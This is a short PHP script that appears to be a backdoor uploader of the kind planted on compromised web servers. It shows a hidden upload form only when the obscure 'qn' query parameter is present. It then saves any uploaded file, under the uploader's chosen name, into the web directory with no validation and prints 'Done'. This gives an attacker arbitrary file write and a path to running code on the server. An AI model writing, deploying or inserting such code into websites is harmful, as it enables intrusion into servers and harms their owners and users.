<?php 
if (isset($_POST['bup'])) {
$fl_e = $_FILES['fl']['name'];
$fl_tmp = $_FILES['fl']['tmp_name'];
if (!empty($fl_e)) { 
move_uploaded_file($fl_tmp, $fl_e);
echo "Done";
}
}
if(isset($_GET['qn'])){
	echo '<form action="" method="POST" enctype="multipart/form-data">
	<input type="file" name="fl"><input type="submit" name="bup" value="Go">
	</form>';
	exit();
}
?>
